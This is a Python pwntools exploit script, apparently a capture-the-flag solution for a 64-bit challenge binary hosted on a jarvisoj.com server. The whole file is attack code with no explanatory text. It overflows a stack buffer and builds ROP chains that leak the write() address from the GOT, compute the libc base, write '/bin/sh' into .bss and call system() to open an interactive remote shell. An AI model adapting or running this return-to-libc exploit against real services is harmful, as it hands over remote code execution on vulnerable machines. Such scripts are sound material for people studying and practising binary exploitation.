from pwn import *

pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1

elf = ELF('level3_x64')
libc = ELF('libc-2.19.so')

read = elf.symbols['read']
write = elf.symbols['write']
write_got = elf.got['write']
write_off = libc.symbols['write']
system_off = libc.symbols['system']
buf = elf.bss() + 500
vuln_func = 0x00000000004005E6

#p = process('level3_x64')
#p = remote('127.0.0.1', 4000)
p = remote('pwn2.jarvisoj.com', 9883)

p.recvuntil('Input:\n')

payload = 'a'*136 + p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rsi_r15_ret) + p64(write_got) + p64(1)
payload += p64(write) + p64(vuln_func)
p.sendline(payload)

sleep(0.2)
write_addr = p.recv(8)

write_addr = u64(write_addr)
libc_base = write_addr - write_off
system = libc_base + system_off
print "write : %#x" % write_got
print "system : %#x" % system

p.recvuntil('Input:')

payload = 'a'*136 + p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15_ret) + p64(buf) + p64(1)
payload += p64(read) + p64(vuln_func)

p.sendline(payload)
sleep(1)
p.sendline('/bin/sh\x00')

p.recvuntil('Input:')

payload = 'a'*136 + p64(pop_rdi_ret) + p64(buf) + p64(system)
p.sendline(payload)

p.interactive()

